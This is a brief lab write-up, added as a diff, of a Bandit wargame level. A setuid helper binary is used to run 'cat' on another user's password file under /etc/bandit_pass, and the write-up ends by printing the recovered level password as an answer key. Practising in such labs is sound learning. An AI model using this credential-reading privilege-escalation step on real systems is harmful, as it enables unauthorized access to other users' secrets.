@@ -1,0 +1,19 @@
+What I did:
+
+./bandit20-do cat /etc/bandit_pass/bandit20
+
+To run a binary in linux you just need to specify the directory where it's
+located. So if it's in your current directory you do need the ./ in front. The
+message the executable provided when ran with no arguments was:
+
+bandit19@bandit:~$ ./bandit20-do
+Run a command as another user.
+  Example: ./bandit20-do id
+bandit19@bandit:~$
+
+This message made me think that it required a userid or username as an
+argument. No you just provide any command as an argument and it will be run as
+user bandit20. I used cat on the file which contains the bandit20 password which
+is only accessible to bandit20.
+
+bandit20 password: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
